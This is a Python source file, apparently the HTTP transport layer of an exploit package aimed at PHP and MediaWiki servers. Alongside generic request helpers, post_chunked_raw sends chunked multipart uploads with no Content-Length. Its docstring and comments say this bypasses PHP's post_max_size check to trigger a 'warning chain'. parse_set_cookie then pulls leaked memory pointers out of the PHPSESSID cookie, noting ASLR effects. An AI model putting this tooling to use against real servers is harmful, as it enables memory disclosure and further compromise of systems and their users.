"""Minimal HTTP transport for the clean-room p2s package (docs/76 R1).

Design goals:
  * explicit Endpoint/Response objects, no hidden globals;
  * no upstream code, comments or naming;
  * testable without a target (tests/test_p2s.py uses a local server).

This is deliberately small: retries, worker pinning and TLS knobs live in the
higher layers (R1+), not here.
"""
from __future__ import annotations

import http.client
import ssl
from dataclasses import dataclass, field
from urllib.parse import unquote_to_bytes, urlsplit


@dataclass(frozen=True)
class Endpoint:
    scheme: str
    host: str
    port: int
    base_path: str = "/"

    @classmethod
    def parse(cls, url: str) -> "Endpoint":
        parts = urlsplit(url)
        if parts.scheme not in ("http", "https"):
            raise ValueError("unsupported scheme: %r" % parts.scheme)
        host = parts.hostname
        if not host:
            raise ValueError("missing host in %r" % url)
        port = parts.port or (443 if parts.scheme == "https" else 80)
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query
        return cls(parts.scheme, host, int(port), path)

    def join(self, path: str | None) -> str:
        if not path:
            return self.base_path
        if path.startswith("/"):
            return path
        base = self.base_path.rsplit("/", 1)[0]
        return (base or "") + "/" + path


@dataclass
class Response:
    status: int
    headers: dict[str, str] = field(default_factory=dict)
    body: bytes = b""


def _read(conn: http.client.HTTPConnection, cap: int) -> bytes:
    chunks: list[bytes] = []
    total = 0
    while total < cap:
        data = conn.read(min(65536, cap - total))
        if not data:
            break
        chunks.append(data)
        total += len(data)
    return b"".join(chunks)


def request(endpoint: Endpoint, method: str, path: str | None = None,
            body: bytes | None = None, headers: dict[str, str] | None = None,
            timeout: float = 30.0, read_cap: int = 1 << 20) -> Response:
    """One request -> Response.  Chunked transfer is decoded by http.client."""
    hdrs = dict(headers or {})
    hdrs.setdefault("Connection", "close")
    if body is not None:
        hdrs.setdefault("Content-Length", str(len(body)))
    if endpoint.scheme == "https":
        ctx = ssl.create_default_context()
        conn: http.client.HTTPConnection = http.client.HTTPSConnection(
            endpoint.host, endpoint.port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(endpoint.host, endpoint.port,
                                          timeout=timeout)
    try:
        conn.request(method, endpoint.join(path), body=body, headers=hdrs)
        raw = conn.getresponse()
        hdrs_out = {k.lower(): v for k, v in raw.getheaders()}
        data = _read(raw, read_cap)
        return Response(raw.status, hdrs_out, data)
    finally:
        conn.close()


def get(endpoint: Endpoint, path: str | None = None, **kw) -> Response:
    return request(endpoint, "GET", path, **kw)


def post(endpoint: Endpoint, path: str | None = None, body: bytes = b"",
         **kw) -> Response:
    return request(endpoint, "POST", path, body=body, **kw)


def parse_cookie(headers: dict[str, str], name: str = "PHPSESSID") -> str | None:
    """Extract a cookie value from a lower-cased header dict."""
    raw = headers.get("set-cookie", "")
    for part in raw.split(","):
        first = part.strip().split(";", 1)[0]
        if "=" not in first:
            continue
        key, _, value = first.partition("=")
        if key.strip() == name:
            return value.strip()
    return None


def build_request(method: str, path: str,
                  headers: list[tuple[str, str]],
                  body: bytes = b"") -> bytes:
    """Build a raw HTTP/1.1 request with an explicit header order.

    The warning chain is sensitive to header/allocation order, so callers pass
    the headers as an ordered list instead of a dict.
    """
    lines = ["%s %s HTTP/1.1" % (method, path)]
    lines += ["%s: %s" % (k, v) for k, v in headers]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("latin1") + body


def raw_exchange(endpoint: Endpoint, request: bytes, *,
                 timeout: float = 30.0, read_cap: int = 1 << 20) -> bytes:
    """Send raw bytes and return the raw response (headers + body)."""
    import socket
    s = socket.create_connection((endpoint.host, endpoint.port),
                                 timeout=timeout)
    try:
        s.settimeout(timeout)
        s.sendall(request)
        data = bytearray()
        while len(data) < read_cap:
            chunk = s.recv(min(65536, read_cap - len(data)))
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)
    finally:
        try:
            s.close()
        except OSError:
            pass


def post_chunked_raw(endpoint: Endpoint, body: bytes, boundary: str, *,
                     timeout: float = 120.0, read_cap: int = 1 << 20,
                     content_type_sep: str = "; ",
                     headers: list[tuple[str, str]] | None = None,
                     ignore_send_errors: bool = False) -> bytes:
    """POST with ``Transfer-Encoding: chunked`` and no Content-Length.

    PHP skips the ``post_max_size`` guard when the request has no
    Content-Length (``SG(request_info).content_length == 0``; php-src 8.3
    ``main/rfc1867.c:720``), which is what makes the de=Off/128M chain and the
    MediaWiki 128M/8M warning shape reachable.  ``headers`` is an ordered list
    inserted right after ``Host`` so callers can add a Cookie without changing
    the default wire order.  The body is streamed in 256 KiB chunks; a reader
    thread collects the response because the worker may abort while the upload
    is still in flight (the already-buffered response would otherwise be lost
    to the RST).
    """
    import socket
    import threading

    crlf = "\r\n"
    head_lines = [
        "POST %s HTTP/1.1" % endpoint.base_path,
        "Host: %s:%d" % (endpoint.host, endpoint.port),
    ]
    head_lines += ["%s: %s" % (k, v) for k, v in (headers or [])]
    head_lines += [
        "Content-Type: multipart/form-data%sboundary=%s"
        % (content_type_sep, boundary),
        "Transfer-Encoding: chunked",
        "Connection: close",
    ]
    head = crlf.join(head_lines) + crlf + crlf

    sock = socket.create_connection((endpoint.host, endpoint.port),
                                    timeout=timeout)
    data = bytearray()

    def reader() -> None:
        try:
            while len(data) < read_cap:
                piece = sock.recv(min(65536, read_cap - len(data)))
                if not piece:
                    break
                data.extend(piece)
        except OSError:
            pass

    th = threading.Thread(target=reader, daemon=True)
    th.start()
    try:
        sock.settimeout(timeout)
        sock.sendall(head.encode("latin1"))
        step = 262144
        for off in range(0, len(body), step):
            piece = body[off:off + step]
            try:
                sock.sendall(b"%x\r\n" % len(piece))
                sock.sendall(piece)
                sock.sendall(b"\r\n")
            except OSError:
                # The worker may stop reading (and reset) long before the body
                # is drained -- e.g. post_max_size caps parsing at 8 MiB while
                # the field is 132 MiB.  The response already carries the
                # Set-Cookie leak, so keep reading instead of failing.
                if not ignore_send_errors:
                    raise
                break
        try:
            sock.sendall(b"0\r\n\r\n")
        except OSError:
            if not ignore_send_errors:
                raise
        th.join(timeout=timeout + 1.0)
        return bytes(data)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def parse_set_cookie(raw: bytes, name: str = "PHPSESSID") -> bytes | None:
    """Extract the raw (possibly binary) value of one Set-Cookie header."""
    needle = name.encode() + b"="
    for line in raw.split(b"\r\n"):
        if not line.lower().startswith(b"set-cookie:"):
            continue
        value = line.split(b":", 1)[1].strip()
        for part in value.split(b","):
            first = part.strip().split(b";", 1)[0]
            if first.startswith(needle):
                # php_url_encode() form-encodes the cookie value: byte 0x20
                # becomes '+', so undo that before %XX unquoting.  A leaked
                # pointer containing 0x20 would otherwise be corrupted
                # (ASLR-dependent false negative, docs/68 R24/WP14).
                raw_value = first[len(needle):].decode("latin1").replace("+", " ")
                return unquote_to_bytes(raw_value)
    return None
